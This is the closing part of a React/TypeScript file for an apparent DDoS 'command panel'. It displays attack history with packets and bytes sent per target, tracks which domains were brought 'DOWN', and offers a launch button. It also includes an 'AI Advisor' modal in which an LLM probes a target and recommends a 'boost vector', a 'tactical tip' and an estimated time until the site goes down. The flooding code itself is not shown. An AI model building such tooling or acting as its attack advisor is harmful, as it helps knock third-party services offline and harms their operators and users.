                    : allAttacks.map((a: { id: number; target: string; method: string; status: string; packetsSent?: number | null; bytesSent?: number | null; duration?: number | null; createdAt: string | Date; stoppedAt?: string | Date | null }) => {
                        const dur = a.stoppedAt
                          ? Math.round((new Date(a.stoppedAt).getTime() - new Date(a.createdAt).getTime()) / 1000)
                          : a.duration ?? 0;
                        const rps = dur > 0 ? Math.round((a.packetsSent ?? 0) / dur) : 0;
                        return (
                          <div key={a.id} className="lb-history-item" onClick={() => setTarget(a.target)} style={{ cursor: "pointer" }}>
                            <span className="lh-target" title={a.target}>{a.target}</span>
                            <span className="lh-method">{a.method}</span>
                            <span className={`lh-badge lhb-${a.status}`}>{a.status}</span>
                            <span className="lh-pkts">{fmtNum(a.packetsSent ?? 0)} pkts</span>
                            <span className="lh-bytes">{fmtBytes(a.bytesSent ?? 0)}</span>
                            {rps > 0 && <span className="lh-rps" style={{ color: "#D4AF37" }}>{fmtNum(rps)}/s</span>}
                          </div>
                        );
                      })
                  }
                </div>
              )}
            </section>
          </div>
        </div>

        {/* ── Domain Score History ── */}
        {topDomains.length > 0 && (
          <div className="lb-domain-scores">
            <div className="lb-domain-scores-title">
              <span>👁 Strike Intelligence</span>
              <button className="lb-domain-scores-clear" onClick={() => {
                setDomainScores({});
                localStorage.removeItem("lb-domain-scores");
              }}>Clear</button>
            </div>
            <div className="lb-domain-scores-list">
              {topDomains.map(([domain, score]) => {
                const pct = score.total > 0 ? Math.round((score.downed / score.total) * 100) : 0;
                return (
                  <div key={domain} className="lb-domain-score-row">
                    <span className="lb-domain-score-name" title={domain}>{domain}</span>
                    <span className="lb-domain-score-method">{score.lastMethod}</span>
                    <div className="lb-domain-score-bar-wrap">
                      <div className="lb-domain-score-bar-fill" style={{ width: `${pct}%`, background: pct >= 100 ? "#2ecc71" : pct > 0 ? "#D4AF37" : "#444" }}/>
                    </div>
                    <span className={`lb-domain-score-pct ${pct >= 100 ? "lb-domain-score-pct--down" : ""}`}>
                      {pct >= 100 ? "💥 DOWN" : `${score.downed}/${score.total}`}
                    </span>
                  </div>
                );
              })}
            </div>
          </div>
        )}

        {/* ── AI Advisor Modal ── */}
        {showAiModal && (() => {
          const sev = aiData?.severity ? String(aiData.severity).toLowerCase() : null;
          const eff = aiData?.effectiveness != null ? Number(aiData.effectiveness) : null;
          const effColor = eff !== null ? (eff >= 80 ? "#e74c3c" : eff >= 60 ? "#e67e22" : "#D4AF37") : "#D4AF37";
          const sevColors: Record<string, string> = { critical: "#ff2222", high: "#e74c3c", medium: "#e67e22", low: "#2ecc71" };
          const sevColor = sev ? (sevColors[sev] ?? "#D4AF37") : "#D4AF37";
          return (
          <div className="lb-modal-overlay" onClick={() => setShowAiModal(false)}>
            <div className="lb-advisor-modal" onClick={e => e.stopPropagation()}>
              {/* Header */}
              <div className="lb-advisor-modal-hdr">
                <div className="lb-advisor-modal-title">
                  <span className={`lb-advisor-eye-icon${aiLoading ? " lb-advisor-eye-spin" : ""}`}>👁</span>
                  LELOUCH AI ADVISOR
                </div>
                <div style={{ display:"flex", gap:8, alignItems:"center" }}>
                  {sev && <span className="lb-advisor-sev-badge" style={{ background: `${sevColor}22`, border: `1px solid ${sevColor}66`, color: sevColor }}>{sev.toUpperCase()}</span>}
                  <button className="lb-modal-close" onClick={() => setShowAiModal(false)}>✕</button>
                </div>
              </div>

              {/* Body */}
              <div className="lb-advisor-modal-body">
                {aiLoading ? (
                  <div className="lb-advisor-loading">
                    <div className="lb-advisor-loading-eye">👁</div>
                    <div className="lb-advisor-loading-title">Analyzing target…</div>
                    <div className="lb-advisor-loading-sub">Consulting Groq llama-3.3-70b · probing latency & headers</div>
                    <div className="lb-advisor-loading-dots"><span/><span/><span/></div>
                  </div>
                ) : aiError ? (
                  <div className="lb-advisor-error">
                    <div className="lb-advisor-error-icon">⚠</div>
                    <div className="lb-advisor-error-msg">{aiError}</div>
                    <div className="lb-advisor-error-hint">Check target URL format and API connectivity.</div>
                  </div>
                ) : aiData ? (
                  <div className="lb-advisor-content">
                    {/* Effectiveness bar */}
                    {eff !== null && (
                      <div className="lb-advisor-eff-wrap">
                        <div className="lb-advisor-eff-row">
                          <span className="lb-advisor-eff-lbl">EFFECTIVENESS</span>
                          <span className="lb-advisor-eff-pct" style={{ color: effColor }}>{String(eff)}%</span>
                        </div>
                        <div className="lb-advisor-eff-track">
                          <div className="lb-advisor-eff-fill" style={{ width:`${eff}%`, background: effColor, boxShadow:`0 0 8px ${effColor}88` }}/>
                        </div>
                      </div>
                    )}

                    {/* Analysis */}
                    {Boolean(aiData.analysis) && (
                      <div className="lb-advisor-card">
                        <div className="lb-advisor-card-label">ANALYSIS</div>
                        <div className="lb-advisor-card-text">{String(aiData.analysis)}</div>
                      </div>
                    )}

                    {/* Recommendation */}
                    {Boolean(aiData.primaryRecommendation) && (
                      <div className="lb-advisor-card lb-advisor-card--rec">
                        <div className="lb-advisor-card-label">RECOMMENDATION</div>
                        <div className="lb-advisor-card-text">{String(aiData.primaryRecommendation)}</div>
                      </div>
                    )}

                    {/* Vectors row */}
                    <div className="lb-advisor-vectors-row">
                      {Boolean(aiData.boostVector) && (
                        <div className="lb-advisor-vec lb-advisor-vec--boost">
                          <span className="lb-advisor-vec-lbl">⚡ BOOST VECTOR</span>
                          <span className="lb-advisor-vec-method">{String(aiData.boostVector).toUpperCase()}</span>
                        </div>
                      )}
                      {Boolean(aiData.reduceVector) && String(aiData.reduceVector) !== "null" && (
                        <div className="lb-advisor-vec lb-advisor-vec--reduce">
                          <span className="lb-advisor-vec-lbl">↓ REDUCE</span>
                          <span className="lb-advisor-vec-method" style={{ color:"#e67e22" }}>{String(aiData.reduceVector)}</span>
                        </div>
                      )}
                      {Boolean(aiData.estimatedDownIn) && (
                        <div className="lb-advisor-vec lb-advisor-vec--est">
                          <span className="lb-advisor-vec-lbl">⏱ EST. DOWN IN</span>
                          <span className="lb-advisor-vec-method" style={{ color:"#D4AF37" }}>{String(aiData.estimatedDownIn)}</span>
                        </div>
                      )}
                    </div>

                    {/* Tip */}
                    {Boolean(aiData.tip) && (
                      <div className="lb-advisor-card lb-advisor-card--tip">
                        <div className="lb-advisor-card-label">⚔ TACTICAL TIP</div>
                        <div className="lb-advisor-card-text lb-advisor-tip">{String(aiData.tip)}</div>
                      </div>
                    )}

                    {/* Target status */}
                    {Boolean(aiData.targetStatus) && (
                      <div className="lb-advisor-target-row">
                        <span className="lb-advisor-ts-dot" style={{ background: String(aiData.targetStatus).startsWith("2") ? "#2ecc71" : "#e74c3c" }}/>
                        <span className="lb-advisor-ts-code">HTTP {String(aiData.targetStatus)}</span>
                        {aiData.latencyMs != null && <span className="lb-advisor-ts-lat">{String(aiData.latencyMs)}ms probe</span>}
                      </div>
                    )}
                  </div>
                ) : (
                  <div className="lb-advisor-empty">No recommendation yet.</div>
                )}
              </div>

              {/* Footer */}
              {!aiLoading && (
                <div className="lb-advisor-modal-ftr">
                  {Boolean(aiData?.boostVector) && methods.some(m => m.id === String(aiData!.boostVector)) && (
                    <button className="lb-advisor-apply-btn" onClick={() => {
                      setMethod(String(aiData!.boostVector));
                      addLog(`👁 Applied boost vector: ${String(aiData!.boostVector).toUpperCase()}`, "success");
                      setShowAiModal(false);
                    }}>
                      ⚡ APPLY {String(aiData!.boostVector).toUpperCase()}
                    </button>
                  )}
                  <button className="lb-advisor-refresh-btn" onClick={handleAiAdvisor}>↺ REFRESH</button>
                  <button className="lb-advisor-close-btn" onClick={() => setShowAiModal(false)}>CLOSE</button>
                </div>
              )}
            </div>
          </div>
          );
        })()}

        <footer className="lb-footer">
          <img src={GEASS_SYMBOL} className="lb-footer-symbol" alt=""/>
          <span>v3.0 — Lelouch Britannia Command Panel</span>
          <span className="lb-footer-credit">Made by blxckxyz</span>
          <img src={GEASS_SYMBOL} className="lb-footer-symbol" alt="" aria-hidden="true"/>
        </footer>
        <div className="lb-footer-bar"><div className="lb-footer-fill" style={{ width: `${progress}%` }}/></div>
      </div>

      {/* Mobile FAB */}
      <button
        className={`lb-fab ${isRunning ? "lb-fab--stop" : ""}`}
        onClick={handleLaunch}
        aria-label={isRunning ? "Abort Geass" : "Command Geass"}
      >
        <img src={GEASS_SYMBOL} className="lb-fab-glyph-img" alt=""/>
        <span className="lb-fab-label">{isRunning ? "ABORT" : "GEASS"}</span>
      </button>
    </div>
  );
}

export default function App() {
  return (
    <QueryClientProvider client={queryClient}>
      <Panel />
    </QueryClientProvider>
  );
}
